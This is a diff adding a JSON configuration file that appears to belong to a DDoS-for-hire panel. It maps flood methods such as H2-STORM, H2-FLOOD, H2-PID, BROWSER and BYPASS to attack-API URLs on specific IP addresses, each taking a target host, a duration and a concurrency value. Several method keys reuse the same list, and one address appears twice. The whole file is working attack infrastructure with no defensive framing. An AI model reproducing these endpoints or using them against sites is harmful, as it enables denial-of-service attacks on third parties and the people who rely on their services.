@@ -1,0 +1,82 @@
+{
+  "h2-storm": {
+    "api": [
+      "http://103.59.160.226:3333/attack?method=H2-STORM&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.160.244:3333/attack?method=H2-STORM&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.160.245:3333/attack?method=H2-STORM&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.160.207:3333/attack?method=BYPASS&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.160.218:3333/attack?method=BYPASS&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.141:3333/attack?method=H2-FLOOD&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.142:3333/attack?method=H2-FLOOD&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.143:3333/attack?method=BYPASS&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.144:3333/attack?method=BYPASS&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.176:3333/attack?method=H2-PID&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.177:3333/attack?method=H2-PID&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.160.245:3333/attack?method=BYPASS&target=<<$host>>&time=<<$time>>&concurrents=12"
+    ]
+  },
+  "h2-flood": {
+    "api": [
+      "http://103.59.160.226:3333/attack?method=H2-STORM&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.160.244:3333/attack?method=H2-STORM&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.160.245:3333/attack?method=H2-STORM&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.160.207:3333/attack?method=BYPASS&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.160.218:3333/attack?method=BYPASS&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.141:3333/attack?method=H2-FLOOD&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.142:3333/attack?method=H2-FLOOD&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.143:3333/attack?method=BYPASS&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.144:3333/attack?method=BYPASS&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.176:3333/attack?method=H2-PID&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.177:3333/attack?method=H2-PID&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.160.245:3333/attack?method=BYPASS&target=<<$host>>&time=<<$time>>&concurrents=12"
+    ]
+  },
+  "browser": {
+    "api": [
+      "http://103.59.160.226:3333/attack?method=BROWSER&target=<<$host>>&time=<<$time>>&concurrents=4",
+      "http://103.59.160.244:3333/attack?method=BROWSER&target=<<$host>>&time=<<$time>>&concurrents=4",
+      "http://103.59.160.245:3333/attack?method=BROWSER&target=<<$host>>&time=<<$time>>&concurrents=4",
+      "http://103.59.160.207:3333/attack?method=BROWSER&target=<<$host>>&time=<<$time>>&concurrents=4",
+      "http://103.59.160.218:3333/attack?method=BROWSER&target=<<$host>>&time=<<$time>>&concurrents=4",
+      "http://103.59.161.141:3333/attack?method=BROWSER&target=<<$host>>&time=<<$time>>&concurrents=4",
+      "http://103.59.161.142:3333/attack?method=BROWSER&target=<<$host>>&time=<<$time>>&concurrents=4",
+      "http://103.59.161.143:3333/attack?method=BROWSER&target=<<$host>>&time=<<$time>>&concurrents=4",
+      "http://103.59.161.144:3333/attack?method=BROWSER&target=<<$host>>&time=<<$time>>&concurrents=4",
+      "http://103.59.161.176:3333/attack?method=BROWSER&target=<<$host>>&time=<<$time>>&concurrents=4",
+      "http://103.59.161.177:3333/attack?method=BROWSER&target=<<$host>>&time=<<$time>>&concurrents=4",
+      "http://103.59.160.245:3333/attack?method=BROWSER&target=<<$host>>&time=<<$time>>&concurrents=4"
+    ]
+  },
+  "h2-pid": {
+    "api": [
+      "http://103.59.160.226:3333/attack?method=H2-STORM&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.160.244:3333/attack?method=H2-STORM&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.160.245:3333/attack?method=H2-STORM&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.160.207:3333/attack?method=BYPASS&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.160.218:3333/attack?method=BYPASS&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.141:3333/attack?method=H2-FLOOD&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.142:3333/attack?method=H2-FLOOD&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.143:3333/attack?method=BYPASS&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.144:3333/attack?method=BYPASS&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.176:3333/attack?method=H2-PID&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.177:3333/attack?method=H2-PID&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.160.245:3333/attack?method=BYPASS&target=<<$host>>&time=<<$time>>&concurrents=12"
+    ]
+  },
+  "bypass": {
+    "api": [
+      "http://103.59.160.226:3333/attack?method=H2-STORM&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.160.244:3333/attack?method=H2-STORM&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.160.245:3333/attack?method=H2-STORM&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.160.207:3333/attack?method=BYPASS&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.160.218:3333/attack?method=BYPASS&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.141:3333/attack?method=H2-FLOOD&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.142:3333/attack?method=H2-FLOOD&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.143:3333/attack?method=BYPASS&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.144:3333/attack?method=BYPASS&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.176:3333/attack?method=H2-PID&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.161.177:3333/attack?method=H2-PID&target=<<$host>>&time=<<$time>>&concurrents=12",
+      "http://103.59.160.245:3333/attack?method=BYPASS&target=<<$host>>&time=<<$time>>&concurrents=12"
+    ]
+  }
+}
